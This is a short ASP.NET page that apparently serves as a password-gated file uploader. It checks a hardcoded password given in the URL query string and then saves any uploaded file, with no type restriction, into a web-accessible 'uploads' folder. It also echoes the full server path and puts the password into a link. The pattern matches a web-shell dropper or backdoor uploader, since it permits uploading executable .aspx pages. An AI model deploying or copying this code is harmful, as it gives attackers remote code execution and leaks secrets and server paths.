<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.IO" %>
<%
    // ===== CONFIG =====
    string PASSWORD = "admin987654321!@";  // Change this to your password
    string UPLOAD_DIR = Server.MapPath("uploads"); // uploads folder in same directory

    // ===== AUTH CHECK =====
    string p = Request.QueryString["p"];
    if (string.IsNullOrEmpty(p) || p != PASSWORD)
    {
        Response.StatusCode = 403;
        Response.Write("Access Denied");
        Response.End();
    }

    // Ensure uploads folder exists
    if (!Directory.Exists(UPLOAD_DIR))
    {
        Directory.CreateDirectory(UPLOAD_DIR);
    }

    // ===== UPLOAD LOGIC =====
    if (IsPostBack && Request.Files.Count > 0)
    {
        var file = Request.Files[0];
        if (file != null && file.ContentLength > 0)
        {
            string originalName = Path.GetFileName(file.FileName);
            string uniqueName = Guid.NewGuid().ToString() + "_" + originalName;
            string savePath = Path.Combine(UPLOAD_DIR, uniqueName);

            try
            {
                file.SaveAs(savePath);
                Response.Write("✅ File uploaded successfully!<br>");
                Response.Write("Original Name: " + Server.HtmlEncode(originalName) + "<br>");
                Response.Write("Saved As: " + Server.HtmlEncode(uniqueName) + "<br>");
                Response.Write("Full Path: " + Server.HtmlEncode(savePath) + "<br>");
                Response.Write("<a href='?p=" + PASSWORD + "'>← Back to Uploader</a>");
            }
            catch (Exception ex)
            {
                Response.Write("❌ Upload failed: " + Server.HtmlEncode(ex.Message));
                Response.Write("<br>Check folder permissions!");
            }
        }
    }
%>

<!DOCTYPE html>
<html>
<head>
    <title>ASPX File Uploader</title>
</head>
<body>
<h2>ASPX File Uploader</h2>

<form method="post" enctype="multipart/form-data">
    <input type="file" name="file" required>
    <button type="submit">Upload</button>
</form>

<p>Files are saved in: <b>uploads</b> folder (same directory as this ASPX file)</p>
</body>
</html>
